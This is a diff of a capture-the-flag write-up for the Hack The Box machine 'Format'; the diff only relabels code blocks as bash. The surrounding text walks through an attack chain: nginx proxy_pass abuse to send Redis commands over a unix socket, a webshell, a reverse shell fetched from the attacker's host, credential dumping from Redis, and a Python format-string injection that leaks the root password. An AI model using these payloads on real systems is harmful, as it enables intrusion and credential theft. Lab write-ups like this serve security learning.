@@ -12,7 +12,7 @@ Format runs a simple open-source microblogging platform. To acquire unauthorized
 
 `nmap` found three open TCP ports: 22, 80, and 3000.
 
-```
+```bash
 ❯ nmap -sT -sC -sV -p- -T4 -oN nmap.txt 10.10.11.213
 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-06 19:58 WIB
 Nmap scan report for 10.10.11.213 (10.10.11.213)
@@ -38,7 +38,7 @@ Nmap done: 1 IP address (1 host up) scanned in 22.39 seconds
 
 From the `nmap` output, the http service at port 3000 is redirecting to `microblog.htb`. The http service at port 80 is redirecting to `app.microblog.htb`.
 
-```
+```bash
 ❯ curl 10.10.11.213
 <!DOCTYPE html>
 <html>
@@ -88,7 +88,7 @@ First, create an account and create a blog. Then, add the blog to `/etc/hosts`. 
 
 `/etc/nginx/sites-available/default`:
 
-```
+```bash
 server {
         listen 80;
         listen [::]:80;
@@ -118,7 +118,7 @@ server {
 
 There is a misconfiguration at this part:
 
-```
+```bash
         location ~ /static/(.*)/(.*) {
             resolver 127.0.0.1;
             proxy_pass http://$1.microbucket.htb/$2;
@@ -127,7 +127,7 @@ There is a misconfiguration at this part:
 
 The `proxy_pass` feature in Nginx supports proxying requests to local unix sockets. Surprisingly, the URI passed to proxy_pass can be either `http://` or a UNIX-domain socket path specified after the word unix and enclosed in colons. With this feature, we can change the user `pro` field to `true` by sending `HSET` method to `http://microblog.htb/static/unix:/var/run/redis/redis.sock:<username>%20pro%20true%20/`
 
-```
+```bash
 ❯ curl -X "HSET" 'http://microblog.htb/static/unix:/var/run/redis/redis.sock:gh0st%20pro%20true%20/'
 <html>
 <head><title>502 Bad Gateway</title></head>
@@ -148,7 +148,7 @@ With the `pro` access, we can write a webshell to the `/var/www/microblog/<blogn
 
 I can't execute a reverse shell directly from the webshell, so I serve the reverse shell payload externally and retrieve it from the webshell using `curl`.
 
-```
+```bash
 ❯ cat rev.sh
 ───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
        │ File: rev.sh
@@ -162,7 +162,7 @@ Serving HTTP on 0.0.0.0 port 1337 (http://0.0.0.0:1337/) ...
 
 ![webshell_2](./img/webshell_2.png)
 
-```
+```bash
 ❯ nc -nvlp 9001
 Listening on 0.0.0.0 9001
 Connection received on 10.10.11.213 53386
@@ -175,7 +175,7 @@ www-data@format:~/microblog/junk/uploads$
 
 Let's stabilize the shell.
 
-```
+```bash
 www-data@format:~$ script /dev/null -c bash
 script /dev/null -c bash
 Script started, output log file is '/dev/null'.
@@ -197,7 +197,7 @@ redis-cli -s /var/run/redis/redis.sock
 
 Let's check the keys with `KEYS *` and dump all the value from the specific key with `HGETALL key`.
 
-```
+```bash
 redis /var/run/redis/redis.sock> KEYS *
 1) "cooper.dooper:sites"
 2) "cooper.dooper"
@@ -216,7 +216,7 @@ redis /var/run/redis/redis.sock> HGETALL cooper.dooper
 
 I've obtained a password, let's use it to switch to the user `cooper`.
 
-```
+```bash
 www-data@format:~$ su - cooper
 Password:
 cooper@format:~$
@@ -224,7 +224,7 @@ cooper@format:~$
 
 Indeed, we can use this password to switch to the user `cooper` and now we can retrieve the user flag.
 
-```
+```bash
 cooper@format:~$ cat user.txt
 b13339██████████████████████████
 ```
@@ -233,7 +233,7 @@ b13339████████████████████████�
 
 This user has sudo permission on `(root) /usr/bin/license`.
 
-```
+```bash
 cooper@format:~$ sudo -l
 [sudo] password for cooper:
 Matching Defaults entries for cooper on format:
@@ -274,13 +274,13 @@ l = License()
 
 This program accepts a Redis key that will be used to get the username,first-name, and last-name for creating the license key. Because I can control what the value is, I can use this format string `{license.__init__.__globals__[secret-encoded]}` to extract the secret value. Let's create a new Redis key with the format string as the username.
 
-```
+```bash
 HSET gh0st username "{license.__init__.__globals__[secret_encoded]}" first-name first last-name last
 ```
 
 Let's run the program with `-p gh0st`.
 
-```
+```bash
 cooper@format:~$ sudo /usr/bin/license -p gh0st
 
 Plaintext license key:
@@ -294,7 +294,7 @@ gAAAAABlIQd9-pcOI-kp6fFvdGY3vauby5-9pwtaQPKeQObVBUYWPqmqxrE8kWW7qr8DB-Tv5naNgYff
 
 There's a interesting string `unCR4ckaBL3Pa$$w0rd`, this should be the secret value. Let's use this value for switching to the root user.
 
-```
+```bash
 cooper@format:~$ su - root
 Password:
 root@format:~# cat root.txt
